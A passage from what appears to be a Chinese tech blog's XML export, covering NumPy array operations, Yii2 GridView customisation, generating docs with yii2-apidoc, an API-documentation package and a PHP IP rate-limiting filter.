hstack12# 水平拼接np.hstack((t51, t52)) array([[ 0, 1, 2, 3, 4, 5, 12, 13, 14, 15, 16, 17], [ 6, 7, 8, 9, 10, 11, 18, 19, 20, 21, 22, 23]]) 数组的拆分 split12arr = np.random.rand(5,5)arr array([[0.51323562, 0.58188986, 0.96645492, 0.74560963, 0.25843771], [0.66209902, 0.16546576, 0.35851699, 0.81376061, 0.18680752], [0.42327984, 0.33418805, 0.61434484, 0.02092018, 0.7348934 ], [0.6246003 , 0.4429335 , 0.99242307, 0.53883774, 0.93484283], [0.45927832, 0.13045444, 0.90311103, 0.14345885, 0.62611419]]) 123# 横向拆分first, second, third = np.split(arr, [1,3], axis=0)print(first, '\n\n', second, '\n\n', third) [[0.51323562 0.58188986 0.96645492 0.74560963 0.25843771]] [[0.66209902 0.16546576 0.35851699 0.81376061 0.18680752] [0.42327984 0.33418805 0.61434484 0.02092018 0.7348934 ]] [[0.6246003 0.4429335 0.99242307 0.53883774 0.93484283] [0.45927832 0.13045444 0.90311103 0.14345885 0.62611419]] 123# 竖直拆分first, second, third = np.split(arr, [1,3], axis=1)print(first, '\n\n', second, '\n\n', third) [[0.51323562] [0.66209902] [0.42327984] [0.6246003 ] [0.45927832]] [[0.58188986 0.96645492] [0.16546576 0.35851699] [0.33418805 0.61434484] [0.4429335 0.99242307] [0.13045444 0.90311103]] [[0.74560963 0.25843771] [0.81376061 0.18680752] [0.02092018 0.7348934 ] [0.53883774 0.93484283] [0.14345885 0.62611419]] 行或列交换位置利用 索引 进行 行与行、列与列的交换 12t61 = np.arange(24).reshape(4, 6)t61 array([[ 0, 1, 2, 3, 4, 5], [ 6, 7, 8, 9, 10, 11], [12, 13, 14, 15, 16, 17], [18, 19, 20, 21, 22, 23]]) 行交换1234# 行交换# 第二行和第三行交换t61[[2, 1], :] = t61[[1, 2], :]t61 array([[ 0, 1, 2, 3, 4, 5], [12, 13, 14, 15, 16, 17], [ 6, 7, 8, 9, 10, 11], [18, 19, 20, 21, 22, 23]]) 列交换1234# 列交换# 第二列和第三列交换t61[:, [1, 2]] = t61[:, [2, 1]]t61 array([[ 0, 2, 1, 3, 4, 5], [12, 14, 13, 15, 16, 17], [ 6, 8, 7, 9, 10, 11], [18, 20, 19, 21, 22, 23]]) 线性代数线性代数忘了，复习之后再补充 12x = np.array([[1., 2., 3.], [4., 5., 6.]])x array([[1., 2., 3.], [4., 5., 6.]]) 12y = np.array([[6., 23.], [-1, 7], [8, 9]])y array([[ 6., 23.], [-1., 7.], [ 8., 9.]]) 1x.dot(y) array([[ 28., 64.], [ 67., 181.]]) 常用的线性代数方法 函数 说明 diag 以一维数组的形式返回方阵的对角线（或非对角线）元素，或将一组数组转换为方阵（非对角线元素为 0) dot 矩阵乘法 trace 计算对角线元素的和 det 计算矩阵行列式 eig 计算方阵的本征值和本征向量 inv 计算方阵的逆 pinv 计算方阵的 Moore-Penrose 伪逆 qr 计算 QR 分解 svd 计算奇异值分解（SVD） solve 解线性方程组 Ax = b，其中 A 为一个方阵 lstsq 计算 Ax = b 的最小值 Numpy 的文件输入输出1234# 读取 csv 数据# 读取文件数据，以 , 分割arr = np.loadtxt('data/array_ex.txt', delimiter=',')arr array([[1., 2., 3., 4.], [5., 6., 7., 8.], [2., 3., 4., 5.]]) 12345# 写入数据arr = np.arange(50).reshape(2,5,5)print(arr)# 保存到文件 执行之后我们可以看到一个 some_array.npy 文件np.save('data/some_array', arr) [[[ 0 1 2 3 4] [ 5 6 7 8 9] [10 11 12 13 14] [15 16 17 18 19] [20 21 22 23 24]] [[25 26 27 28 29] [30 31 32 33 34] [35 36 37 38 39] [40 41 42 43 44] [45 46 47 48 49]]] 12# 加载 numpy 存入的数据np.load('data/some_array.npy') array([[[ 0, 1, 2, 3, 4], [ 5, 6, 7, 8, 9], [10, 11, 12, 13, 14], [15, 16, 17, 18, 19], [20, 21, 22, 23, 24]], [[25, 26, 27, 28, 29], [30, 31, 32, 33, 34], [35, 36, 37, 38, 39], [40, 41, 42, 43, 44], [45, 46, 47, 48, 49]]]) 12# 多个数组同时 压缩存储np.savez('data/some_arrayz', a=arr, b=arr, c=arr) 123# 读取多个数组压缩后的文件数据 arch = np.load('data/some_arrayz.npz')arch['a'] array([[[ 0, 1, 2, 3, 4], [ 5, 6, 7, 8, 9], [10, 11, 12, 13, 14], [15, 16, 17, 18, 19], [20, 21, 22, 23, 24]], [[25, 26, 27, 28, 29], [30, 31, 32, 33, 34], [35, 36, 37, 38, 39], [40, 41, 42, 43, 44], [45, 46, 47, 48, 49]]]) 补充方法获取最大值或最小值的位置12t71 = np.arange(24).reshape(4, 6)t71 array([[ 0, 1, 2, 3, 4, 5], [ 6, 7, 8, 9, 10, 11], [12, 13, 14, 15, 16, 17], [18, 19, 20, 21, 22, 23]]) 12# 获取竖着的最大的坐标值np.argmax(t71, axis = 0) array([3, 3, 3, 3, 3, 3]) 12# 获取横着的最大的坐标值np.argmax(t71, axis = 1) array([5, 5, 5, 5]) 12# 获取竖着的最小的坐标值np.argmin(t71, axis = 0) array([0, 0, 0, 0, 0, 0]) 小数四舍五入123# 生成随机数t6 = np.array([random.random() for i in range(6)])t6 array([0.98162522, 0.34459695, 0.22603344, 0.14799318, 0.34621457, 0.78629889]) 123# 保留小数位数, 指定小数位数（四舍五入）t7 = np.round(t6, 2)t7 array([0.98, 0.34, 0.23, 0.15, 0.35, 0.79]) 排序12arr = np.random.randn(6)arr array([ 0.76489147, 0.65253326, -1.18840851, 1.072042 , 0.84549233, -0.45669231]) 123# 从小到大排序arr.sort()arr array([-1.18840851, -0.45669231, 0.65253326, 0.76489147, 0.84549233, 1.072042 ]) 123456# 多维数组指定根据某一维进行排序arr = np.random.randn(5,3) * 10print(arr)# 根据第一维进行排序arr.sort(1)print(arr) [[ -7.17969463 -1.44401898 -3.04804793] [ -8.68580105 1.55168534 -10.53525551] [ -7.26578011 -12.26002953 -8.4707146 ] [ 10.16939017 -14.70839867 5.48670214] [ -8.65931279 -12.05255559 -5.20118478]] [[ -7.17969463 -3.04804793 -1.44401898] [-10.53525551 -8.68580105 1.55168534] [-12.26002953 -8.4707146 -7.26578011] [-14.70839867 5.48670214 10.16939017] [-12.05255559 -8.65931279 -5.20118478]] 12 唯一化12names = np.array(['Bob', 'Joe', 'Will', 'Bob', 'Will', 'Joe', 'Joe'])np.unique(names) array([&apos;Bob&apos;, &apos;Joe&apos;, &apos;Will&apos;], dtype=&apos;&lt;U4&apos;) 12names = np.array([['Bob', 'Joe', 'Will', 'Bob', 'Will', 'Joe', 'Joe'], ['ding', 'Joe', 'Will', 'Bob', 'Will', 'Joe', 'Joe']])np.unique(names) array([&apos;Bob&apos;, &apos;Joe&apos;, &apos;Will&apos;, &apos;ding&apos;], dtype=&apos;&lt;U4&apos;)]]></content>
      <categories>
        <category>数据分析</category>
        <category>Numpy</category>
      </categories>
      <tags>
        <tag>numpy</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Gridview使用汇总]]></title>
    <url>%2F2019%2F02%2F22%2Fyii%2FGridview%E4%BD%BF%E7%94%A8%E6%B1%87%E6%80%BB%2F</url>
    <content type="text"><![CDATA[列相关先看一个gii生成的正常状态下的Gridview123456789101112131415161718192021GridView::widget([ 'dataProvider' =&gt; $dataProvider, 'filterModel' =&gt; $searchModel, 'columns' =&gt; [ // ['class' =&gt; 'yii\grid\SerialColumn'], ['class' =&gt; 'yii\grid\CheckboxColumn'], 'id', 'user_id', 'goods_id', 'need_num', 'has_num', 'status', 'created_at:datetime', 'end_time:datetime', //'updated_at', //'ver', ['class' =&gt; 'yii\grid\ActionColumn'], ],]); 我们要修改展示内容，修改的就是 columns 下的值 格式化列的值一般修改一个列的值的使用格式如下，将数值对应成文字1234567[ 'attribute' =&gt; 'groupon_status', # 对应的属性 'label' =&gt; '团购状态', # 列的title 'value' =&gt; function($model) &#123; # 根据对应的属性值返回要显示的数据 return $model-&gt;groupon_status == 1 ? '进行中' : '已成团'; &#125;,], 当然为了方便，yii也提供了一些特有的格式化格式化时间戳123[ 'time:datetime', # 时间戳格式化成时间] 下面罗列一下额外的参数配置 单元格显示html默认是过滤html的12345678910[ 'attribute' =&gt; 'groupon_id', 'label' =&gt; '团购信息', 'format'=&gt;'raw',// 一定要设置这个才可以显示html 'value' =&gt; function($model) &#123; $url = "/groupon/view?id=".$model-&gt;groupon_id; return Html::a('点击查看团购信息', $url, ['title' =&gt; '点击查看团购信息']); &#125;,], 自定义按钮12345678910111213141516171819202122232425[ [ 'class' =&gt; 'yii\grid\ActionColumn', 'template' =&gt; '&#123;view&#125; &#123;update&#125; &#123;delete&#125;', 'header' =&gt; '操作', 'buttons' =&gt; [ 'view'=&gt; function ($url, $model, $key)&#123; $str = '&lt;span class="glyphicon glyphicon-eye-open"&gt;&lt;/span&gt;'; return Html::a($str, null, ['lay-href' =&gt; Url::to(['view', 'id'=&gt;$model-&gt;id])]) ; &#125;, 'update'=&gt; function ($url, $model, $key)&#123; $str = '&lt;span class="glyphicon glyphicon-pencil"&gt;&lt;/span&gt;'; return Html::a($str, null, ['lay-href' =&gt; Url::to(['update', 'id'=&gt;$model-&gt;id])]) ; &#125;, 'delete'=&gt; function ($url, $model, $key)&#123; $str = $model-&gt;putaway ? '下架' : '上架'; return Html::a($str, ['putaway', 'id'=&gt;$model-&gt;id], [ 'data-confirm' =&gt; '确定'.$str.'该商品？', //添加确认框 'style' =&gt; $model-&gt;putaway ? '':'color:red' ]) ; &#125; ], ],] 搜索改为下拉框12345678[ 'attribute' =&gt; 'groupon_status', # 对应的属性 'label' =&gt; '团购状态', # 列的title 'value' =&gt; function($model) &#123; # 根据对应的属性值返回要显示的数据 return $model-&gt;groupon_status == 1 ? '进行中' : '已成团'; &#125;, 'filter' =&gt; [ 1 =&gt; '进行中', 2 =&gt; '已成团'] # 搜索框改成下拉选项], 列title不使用排序功能12345[ 'attribute' =&gt; 'groupon_status', # 对应的属性 'label' =&gt; '团购状态', # 列的title 'enableSorting'=&gt;false, # 不使用排序功能 ], 这个可以在gii生成的对应的 search 模型中进行更改，相对比较麻烦123456789101112131415public function search($params)&#123; $query = Groupon::find(); $dataProvider = new ActiveDataProvider([ 'query' =&gt; $query, ]); // 排序功能，只有写在attributes里面的属性才会有排序功能 $dataProvider-&gt;setSort([ 'attributes' =&gt; [ 'groupon_status', ] ]);&#125; headerOptions 控制列属性 样式针对于列样式，GridView提供了3个属性，分别为 headerOptions 、 contentOptions 和 footerOptions(还没发现footer有实际用途)headerOptions 控制的是 th 的样式 也就是我们看到的titlecontentOptions 控制的是 td 的样式 也就是我们看到的显示的列内容123456[ 'attribute' =&gt; 'groupon_status', # 对应的属性 'label' =&gt; '团购状态', # 列的title 'headerOptions' =&gt; ['style'=&gt;'color:red'], # title的文字颜色改成红色 'contentOptions' =&gt; ['style'=&gt;'color:blue;min-width:100px;'], # 列文字改成绿色，列宽设置最小为100px ], 隐藏列GridView列的visible属性，此属性默认为true代表此列显示，通过设置visible属性可以隐藏一列，这种隐藏非css的display:none，而是在渲染表格的时候就去掉了此列。visible是可以传递一个表达式，实现逻辑判断，比如下面的需求当1号管理员登录的时候可以看到省市一列。12345[ 'attribute' =&gt; 'groupon_status', # 对应的属性 'label' =&gt; '团购状态', # 列的title 'visible' =&gt; (Yii::$app-&gt;admin-&gt;id === 1) # 只有id === 1 的才显示这一列 ], 增加列表勾选框列在cloumns中加入以下代码 虽然不知道有什么用处1['class' =&gt; 'yii\grid\CheckboxColumn'], 行相关rowOptions 管理tbody下tr的属性12345678910111213141516171819202122GridView::widget([ 'dataProvider' =&gt; $dataProvider, 'filterModel' =&gt; $searchModel, 'caption'=&gt;"会员列表", # 显示table的标题 'captionOptions' =&gt; ['style' =&gt; 'color:red'], # 控制caption的属性 'columns' =&gt; [ ... ], /** * $model 当前对象 * $key 当前对象的主键 * $index 当前页面第几行，从0开始 * $grid Gridview 对象 * * goods_id 等于 11 的行背景改为红色 */ 'rowOptions'=&gt;function($model, $key, $index, $grid)&#123; if($model-&gt;goods_id == 11)&#123; return ['style'=&gt;'background:red']; &#125; &#125;]); beforeRow和afterRow 行前行后增加要显示的数据这是一对非常灵活的属性，它们接收一个匿名函数。分别表示在渲染了一行之前和之后发生点什么要记住的是，匿名函数返回的结果也会作为一行纳入到渲染过程，比如当我们遇到奇数的时候就在此行下面添加一行，可以如下代码1234567891011121314151617GridView::widget([ 'dataProvider' =&gt; $dataProvider, 'columns'=&gt;[ ..... ], /** * $model 当前对象 * $key 当前对象的主键 * $index 当前页面第几行，从0开始 * $grid Gridview 对象 */ 'afterRow'=&gt;function($model, $key, $index, $grid)&#123; if(($index+1)%2 != 0)&#123; return "&lt;tr&gt;&lt;td colspan='4'&gt;我是基数&lt;/td&gt;&lt;/tr&gt;"; &#125; &#125;]); 整体显示相关更改layoutlayout表示列表显示的样式，一个列表有三个部分组成 items 列表部分、summary 显示第几页共几页的部分、 pages 分页部分 更改显示顺序，把显示第几页共几页部分放到列表下面12345678GridView::widget([ 'dataProvider' =&gt; $dataProvider, 'filterModel' =&gt; $searchModel, 'layout'=&gt;"&#123;items&#125;\n&#123;summary&#125;\n&#123;pager&#125;", # 显示调整 'columns' =&gt; [ ... ],]); 修改分页显示显示在右侧，并替换分页的显示的内容12345678910111213141516GridView::widget([ 'dataProvider' =&gt; $dataProvider, 'filterModel' =&gt; $searchModel, //重新定义分页样式 'layout'=&gt; '&#123;items&#125;&lt;div class="text-right tooltip-demo"&gt;&#123;pager&#125;&lt;/div&gt;', 'pager'=&gt;[ //'options'=&gt;['class'=&gt;'hidden']//关闭分页 'firstPageLabel'=&gt;"First", 'prevPageLabel'=&gt;'Prev', 'nextPageLabel'=&gt;'Next', 'lastPageLabel'=&gt;'Last', ], 'columns' =&gt; [ ... ],]); 不显示title和搜索框12345678GridView::widget([ 'dataProvider' =&gt; $dataProvider, 'filterModel' =&gt; $searchModel, 'showHeader'=&gt;false, # 不显示title和搜索框 'columns' =&gt; [ ... ],]); 增加表的标题也就是增加table的caption，在table的上边显示标题123456789GridView::widget([ 'dataProvider' =&gt; $dataProvider, 'filterModel' =&gt; $searchModel, 'caption'=&gt;"会员列表", # 显示table的标题 'captionOptions' =&gt; ['style' =&gt; 'color:red'], # 控制caption的属性 'columns' =&gt; [ ... ],]); tableOptions和options属性 管理table属性这两个属性有的开发者可能会混淆，接下来我用一张图让你瞬间明白。就是说GridView渲染的时候首先弄出来一个div容器，这是这个GridView的代表，接下来在此容器内放各种元素，比如 {summary}、{items} 等等。options 控制着 div容器 的属性，默认添加一个 class=&quot;grid-view&quot;tableOptions 控制着 {items} 表格table的属性，默认为其添加一个 class=&quot;table table-striped table-bordered&quot; headerRowOptions 管理thead下的tr属性headerRowOptions 它管理的是thead下tr的属性。 emptyCell 管理空单元格的显示emptyCell 又是一个小细节，如果一个单元格为空，用什么字符填充那？默认是 &amp;nbsp，你可以重新指定。 控制分页显示数量这个可以在gii生成的对应的 search 模型中进行更改，相对比较麻烦12345678910public function search($params)&#123; $query = Groupon::find(); $dataProvider = new ActiveDataProvider([ 'query' =&gt; $query, # 设置分页大小 'pagination' =&gt; ['pageSize' =&gt; 1], ]);&#125; 让关联字段带搜索和排序功能假设现在有一张团购表 groupon 通过Gridview进行展示，表中存有 goods_id 关联的是 goods 表的 id, user_id 关联的是 user 表的 id现在要在展示的时候把对应的id转换成名称，这就需要进行表的关联 1. model中定义关联表AR模型类12345678910111213141516171819202122class Groupon extends \yii\db\ActiveRecord&#123; ..... ..... /** * 关联user表 * @return [type] [description] */ public function getUser() &#123; return $this-&gt;hasOne(User::className(), ['id' =&gt; 'user_id']); &#125; /** * 关联商品表 * @return [type] [description] */ public function getGoods() &#123; return $this-&gt;hasOne(GoodsModel::className(), ['id' =&gt; 'goods_id']); &#125;&#125; 2. search 模型的修改gii根据AR模型类生成的search模型123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354class GrouponSearch extends Groupon&#123; // 定义属性和规则是为了让可以搜索 public $username; public $goodsName; public $goodsNo; /** * &#123;@inheritdoc&#125; */ public function rules() &#123; return [ .... // 添加属性规则，添加了才会有搜索 [['username', 'goodsName', 'goodsNo'], 'safe'], ]; &#125; public function search($params) &#123; $query = Groupon::find(); // 进行联表，joinWith联表 即时加载 ，也就是用了in的搜索，减少查询次数 // 此处的user和goods对应的是model中定义的getUser和getGoods关联 $query-&gt;joinWith(['user']); $query-&gt;joinWith(['goods']); $dataProvider = new ActiveDataProvider([ 'query' =&gt; $query, # 设置分页大小 'pagination' =&gt; ['pageSize' =&gt; 1], ]); // 排序功能(点击title进行排序)，定义在attributes中的属性才能使用排序功能 $dataProvider-&gt;setSort([ 'attributes' =&gt; array_merge(self::attributes(), [ 'username' =&gt; [ 'asc' =&gt; ['user.username' =&gt; SORT_ASC], 'desc' =&gt; ['user.username' =&gt; SORT_DESC], 'label' =&gt; 'Customer Name' ], ]) ]); ... ... // 添加搜索过滤条件 $query-&gt;andFilterWhere(['like', 'user.username', $this-&gt;username]) ; $query-&gt;andFilterWhere(['like', 'goods.goods_name', $this-&gt;goodsName]) ; $query-&gt;andFilterWhere(['like', 'goods.goods_no', $this-&gt;goodsNo]) ; return $dataProvider; &#125;&#125; 3. 视图修改123456789101112131415161718192021222324252627282930GridView::widget([ 'dataProvider' =&gt; $dataProvider, 'filterModel' =&gt; $searchModel, 'columns' =&gt; [ // ['class' =&gt; 'yii\grid\SerialColumn'], ['class' =&gt; 'yii\grid\CheckboxColumn'], 'id', 'user_id', [ 'label'=&gt;'用户名', 'attribute' =&gt; 'username', # search模型中定义的属性 'value' =&gt; 'user.username' # 联表user对应的属性值 ], [ 'label'=&gt;'商品名', 'attribute' =&gt; 'goodsName', # search模型中定义的属性 'value' =&gt; 'goods.goods_name' # 联表goods对应的属性值 ], [ 'label'=&gt;'商品编号', 'attribute' =&gt; 'goodsNo', # search模型中定义的属性 'value' =&gt; 'goods.goods_no' # 联表goods对应的属性值 ], 'created_at:datetime', 'end_time:datetime', ['class' =&gt; 'yii\grid\ActionColumn'], ],]); 参考Yii2的GridView使用大全yii2数据列表插件-gridviewyii2-GridView在开发中常用的功能及技巧Yii2-GridView 中让关联字段带搜索和排序功能]]></content>
      <categories>
        <category>yii</category>
      </categories>
      <tags>
        <tag>yii</tag>
        <tag>gridview</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[yii-apidoc的使用]]></title>
    <url>%2F2019%2F01%2F03%2Fyii%2Fyii-apidoc%E6%89%A9%E5%B1%95%2F</url>
    <content type="text"><![CDATA[前言我们可以通过 yii-apidoc 来通过反射拿取备注的方式生成类的说明文档，也可以根据md文件转换成说明文档，这里主要运用的是md来转换成使用文档，和 hexo 的原理一样 安装apidoc文档说明 1composer require yiisoft/yii2-apidoc 安装的时候可能会进行报错12345678910111213141516......Your requirements could not be resolved to an installable set of packages. Problem 1 - Conclusion: don't install yiisoft/yii2-apidoc 2.1.1 - Conclusion: remove cebe/markdown 1.1.2 - Installation request for yiisoft/yii2-apidoc ^2.1 -&gt; satisfiable by yiisoft/yii2-apidoc[2.1.0, 2.1.1]. - Conclusion: don't install cebe/markdown 1.1.2 - yiisoft/yii2-apidoc 2.1.0 requires cebe/markdown-latex ~1.0 -&gt; satisfiable by cebe/markdown-latex[1.0.0, 1.1.0, 1.1.1, 1.1.2, 1.1.3, 1.1.4]....... 意思就是要删除 cebe/markdown 这个依赖包使用 composer remove cebe/markdown 删除，发现 没用 。 composer.lock 中依旧还有。好吧，我承认我的 composer 不太会用，直接在 composer.lock 中把 cebe/markdown 1.1.2 和 phpdocumentor/reflection-docblock 3.3.2 的包删除就可以进行安装了 使用yii-apidocyii-apidoc 有两个功能，一个是根据类的注释自动生成类的说明文档，生成结果可以参考 yii-类参考文档 ，另一个就是根据 md 文档来生成文档，这个用处挺大我们主讲。 生成类的使用说明以项目的 frontend 文件夹下 的类为列生成类说明文档1vendor/bin/apidoc api frontend classdoc 如果成功执行将会创建 classdoc 文件夹，里面存放着生成的类说明文档具体的注释格式可以参考 apidoc 使用说明 通过md文件生成文档将我们写的md文档生成html做成网站、也可以生成pdf，可以说非常方便 参考 我们举个例子以创建的 sourcedocs 文件加下的md文件为例 首先我们要创建 README.md 文件，这个文件是一个目录文件 12345678910111213141516171819202122232425md文档测试===============================&gt; 目录页 `===` 是必须要的目录一-----* [目录1.1](index.md)* [目录1.2](menu11.md)* [目录1.3](menu1/menu12.md)balabala目录二-----* [目录2.1](menu2/menu21.md)* [目录2.2](menu2/menu22.md)* [目录2.3](menu2/menu23.md)目录三-----------* [目录3.1](menu3/menu31.md)* [目录3.2](menu3/menu32.md)![图片](/images/apidoc1.png)部署到站点才可以引用本地图片。 创建链接对应的md文件 生成html 1vendor/bin/apidoc guide sourcedocs mddoc 生成pdf的自己测试，官方文档上有 其实原理和hexo一样，将md按照模版转换成html，我们在熟悉之后可以对模版进行修改来更改外观有一点暇疵的是，根据目录归类后会导致点击目录的时候不选中当前，需要都放在一个目录下，如 sourcedocs 有时间可以看看改改 千万别看演示项目参考 注意： win平台的无法执行上面的命令，需要进入到 vendor/bin 内直接执行 apidoc api @frontend classdoc linux和mac平台需要给 apidoc 文件赋予可执行权限]]></content>
      <categories>
        <category>yii</category>
      </categories>
      <tags>
        <tag>yii</tag>
        <tag>yii-apidoc</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[好用的api文档(包)]]></title>
    <url>%2F2019%2F01%2F03%2Fyii%2F%E8%87%AA%E5%B7%B1%E5%86%99%E7%9A%84%E4%B8%80%E4%B8%AAyii-apidoc%E6%89%A9%E5%B1%95%2F</url>
    <content type="text"><![CDATA[前言上次已经介绍过了 yii-apidoc 扩展，但是根据备注生成接口文档感觉还不是我们真正需要的。也稍微查了一下 apidoc 是可以生成接口文档的，但是看到要装这装那也就没倒腾。之前看到过一个及其好用的生成接口文档并提供接口测试的项目，做成一个包供大家使用。这个因为用到Yii框架，所以依赖于Yii，你也可以根据自己的框架改动部分代码 使用说明packagist地址 安装1composer require ibunao/yii2-apidoc 配置配置到模块数组假设我们要放到 backend 项目下12345678910111213'modules' =&gt; [ ... ... 'document' =&gt; [ 'class' =&gt; 'ibunao\apidoc\Module', # 配置访问接口的host 通常配置 frontend 项目的域名 'debugHost' =&gt; 'http://api.yiidoc.com', # 和配置时定义的模块名一致 'moduleName' =&gt; 'document', ], ... ...], 注意：如果访问的是其他域名，会存在跨域问题，需要在指向项目中添加header头,如 header(&quot;Access-Control-Allow-Origin: *&quot;); 允许所有 配置需要接口文档的控制器123456789101112return [ 'apiList' =&gt; [ 'test' =&gt; [ 'label' =&gt; '文档测试', 'class' =&gt; 'frontend\controllers\ApidocController', ], 'test2' =&gt; [ 'label' =&gt; '文档测试2', 'class' =&gt; 'frontend\controllers\Apidoc2Controller', ], ],]; 表和静态资源剩下的需要设置的就是创建一个表用来存储文档编辑部分数据，还有就是将静态资源放到指定位置。相关文件放在 vendor\ibunao\yii2-apidoc\source 需要创建表的sql看 document_api.sql 文件 以配在 backend 项目为例，把 css 和 js 文件夹放在 backend\web 下 为什么不用资源发布和数据库迁移？不想费劲 生成文档的备注格式@name表示接口名称，不注释则文档不显示该接口 @uses表示接口简介/用途等，可空 @method表示请求方式，不注释默认为get @param表示请求参数，可空可多个，后面分别跟类型、参数名，备注 @author表示接口作者/负责人，可空 1234567891011121314/** * 注册步骤一：手机号获取验证码 * * @name 获取注册验证码 * @uses 用户注册是拉取验证码 * @method post * @param string $phone 手机号 * @author echoding */public function actionIndex()&#123; Yii::$app-&gt;response-&gt;format = 'json'; return Yii::$app-&gt;request-&gt;post();&#125; 示例首页 可以编辑文档说明和示例 接口调试]]></content>
      <categories>
        <category>yii</category>
      </categories>
      <tags>
        <tag>yii</tag>
        <tag>yii-apidoc</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ip访问速率控制]]></title>
    <url>%2F2018%2F12%2F26%2Fyii%2FIp%E8%AE%BF%E9%97%AE%E9%80%9F%E7%8E%87%E6%8E%A7%E5%88%B6%2F</url>
    <content type="text"><![CDATA[前言Yii 的 restful 实现了用户访问速率的控制(RateLimiter)，但是是基于 user 组件的，也就是说用户需要先登录。这里仿照 RateLimiter 写了一个基于 Ip 的控制访问速率的，需要用到 cache 组件用来进行存储每个ip访问的次数和时间。 配置和扩展把过滤器注册进控制器中12345678910public function behaviors()&#123; return [ 'ipRateLimiter' =&gt; [ 'class' =&gt; IpRateLimiter::className(), # 开启过滤 'enabled' =&gt; true ], ];&#125; 扩展的话需要先看一下下面给出的代码。需要更改的有三个方法123getRateLimit($request, $action)loadAllowance($request, $action)saveAllowance($request, $action, $allowance, $timestamp) 这三个方法的作用下面代码中的备注已经很清楚了，也给了一个简单的 dome。三个方法都包含了 $request, $action 两个参数，可以通过这两个对每个 action 的访问进行更精细的控制 IpRateLimiter 代码参考123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179&lt;?phpnamespace common\behaviors;use Yii;use yii\base\ActionFilter;use yii\web\Request;use yii\web\Response;use yii\web\TooManyRequestsHttpException;/** * IpRateLimiter implements a rate limiting algorithm based on the [leaky bucket algorithm](http://en.wikipedia.org/wiki/Leaky_bucket). * * You may use IpRateLimiter by attaching it as a behavior to a controller or module, like the following, * * * public function behaviors() * &#123; * return [ * 'ipRateLimiter' =&gt; [ * 'class' =&gt; \common\behaviors\IpRateLimiter::className(), * 'enabled' =&gt; true * ], * ]; * &#125; * * * When the user has exceeded his rate limit, RateLimiter will throw a [[TooManyRequestsHttpException]] exception. * * * @since 2.0 */class IpRateLimiter extends ActionFilter&#123; /** * @var bool whether to include rate limit headers in the response */ public $enableRateLimitHeaders = true; /** * @var string the message to be displayed when rate limit exceeds */ public $errorMessage = 'Rate limit exceeded.'; /** * 访问的ip */ public $ip; # 缓存的key private $cacheKey; /** * 是否启用 * @var [type] */ public $enabled = false; /** * @var Request the current request. If not set, the `request` application component will be used. */ public $request; /** * @var Response the response to be sent. If not set, the `response` application component will be used. */ public $response; /** * &#123;@inheritdoc&#125; */ public function init() &#123; if ($this-&gt;request === null) &#123; $this-&gt;request = Yii::$app-&gt;getRequest(); &#125; if ($this-&gt;response === null) &#123; $this-&gt;response = Yii::$app-&gt;getResponse(); &#125; if ($this-&gt;ip === null) &#123; $this-&gt;ip = $this-&gt;request-&gt;getUserIP(); &#125; $this-&gt;cacheKey = 'ip-rate-limiter-key'.$this-&gt;ip; &#125; /** * &#123;@inheritdoc&#125; */ public function beforeAction($action) &#123; # 如果配置了速率，进行检查 if ($this-&gt;enabled) &#123; Yii::debug('Check ip rate limit', __METHOD__); $this-&gt;checkRateLimit($this-&gt;request, $this-&gt;response, $action); &#125; return true; &#125; /** * 检查速率 * Checks whether the rate limit exceeds. * @param RateLimitInterface $user the current user * @param Request $request * @param Response $response * @param \yii\base\Action $action the action to be executed * @throws TooManyRequestsHttpException if rate limit exceeds */ public function checkRateLimit($request, $response, $action) &#123; // 获取速率限制 最大次数 时间段 list($limit, $window) = $this-&gt;getRateLimit($request, $action); // 剩余允许请求数量 上次访问的时间戳 list($allowance, $timestamp) = $this-&gt;loadAllowance($request, $action); $current = time(); // 计算允许的请求数量 $allowance += (int) (($current - $timestamp) * $limit / $window); if ($allowance &gt; $limit) &#123; $allowance = $limit; &#125; // 请求量用完了, 直接抛出异常 if ($allowance &lt; 1) &#123; $this-&gt;saveAllowance($request, $action, 0, $current); $this-&gt;addRateLimitHeaders($response, $limit, 0, $window); throw new TooManyRequestsHttpException($this-&gt;errorMessage); &#125; $this-&gt;saveAllowance($request, $action, $allowance - 1, $current); $this-&gt;addRateLimitHeaders($response, $limit, $allowance - 1, (int) (($limit - $allowance + 1) * $window / $limit)); &#125; /** * Adds the rate limit headers to the response. * @param Response $response * @param int $limit the maximum number of allowed requests during a period * @param int $remaining the remaining number of allowed requests within the current period * @param int $reset the number of seconds to wait before having maximum number of allowed requests again */ public function addRateLimitHeaders($response, $limit, $remaining, $reset) &#123; if ($this-&gt;enableRateLimitHeaders) &#123; $response-&gt;getHeaders() -&gt;set('X-Rate-Limit-Limit', $limit)// 同一个时间段所允许的请求的最大数目; -&gt;set('X-Rate-Limit-Remaining', $remaining)// 在当前时间段内剩余的请求的数量; -&gt;set('X-Rate-Limit-Reset', $reset);// 为了得到最大请求数所等待的秒数。 &#125; &#125; /** * 返回一段时间内允许请求的最大次数 * @param [type] $request request 对象 * @param [type] $action 访问的action * @return [type] [description] */ public function getRateLimit($request, $action) &#123; // 每五秒可以访问2次 return [2, 5]; &#125; /** * 获取允许请求的数量和最后的访问的时间戳 * @param [type] $request request 对象 * @param [type] $action 访问的action * @return [type] [请求次数, 最后访问时间] */ public function loadAllowance($request, $action) &#123; if ($data = Yii::$app-&gt;cache-&gt;get($this-&gt;cacheKey)) &#123; return $data; &#125; return [0, 0]; &#125; /** * 保存剩余的请求数量和最后的访问时间 * @param [type] $request request 对象 * @param [type] $action 请求的action * @param [type] $allowance 允许的次数 * @param [type] $timestamp 当前时间 * @return [type] [description] */ public function saveAllowance($request, $action, $allowance, $timestamp) &#123; Yii::$app-&gt;cache-&gt;set($this-&gt;cacheKey, [$allowance, $timestamp]); &#125;&#125;]]></content>
      <categories>
        <category>yii</category>
      </categories>
      <tags>
        <tag>yii</tag>
        <tag>ip访问速率控制</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[爬虫参考项目]]></title>
